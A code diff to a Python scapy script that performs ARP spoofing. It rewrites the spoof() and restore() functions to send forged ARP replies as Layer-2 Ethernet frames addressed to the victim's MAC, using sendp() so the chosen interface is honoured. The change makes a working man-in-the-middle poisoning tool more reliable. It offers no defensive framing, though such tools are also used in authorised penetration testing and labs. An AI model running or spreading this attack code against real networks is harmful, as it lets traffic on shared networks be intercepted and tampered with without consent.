@@ -20,9 +20,14 @@ def spoof(target_ip, spoof_ip, iface=None, target_mac=None):
     if target_mac is None:
         return None
 
-    # op=2 is an ARP reply. We omit hwsrc so scapy fills in our own MAC.
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, iface=iface, verbose=False)
+    # Build at Layer 2: address the Ethernet frame directly to the victim and
+    # send with sendp() so the chosen interface is honoured (scapy.send() at L3
+    # ignores iface and warns about the missing Ethernet destination MAC).
+    # op=2 is an ARP reply; we omit ARP hwsrc so scapy fills in our own MAC.
+    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
+        op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
+    )
+    scapy.sendp(packet, iface=iface, verbose=False)
     return target_mac
 
 
@@ -38,14 +43,14 @@ def restore(dest_ip, source_ip, iface=None, count=4):
         )
         return False
 
-    packet = scapy.ARP(
+    packet = scapy.Ether(dst=dest_mac) / scapy.ARP(
         op=2,
         pdst=dest_ip,
         hwdst=dest_mac,
         psrc=source_ip,
         hwsrc=source_mac,
     )
-    scapy.send(packet, count=count, iface=iface, verbose=False)
+    scapy.sendp(packet, count=count, iface=iface, verbose=False)
     return True
 
 
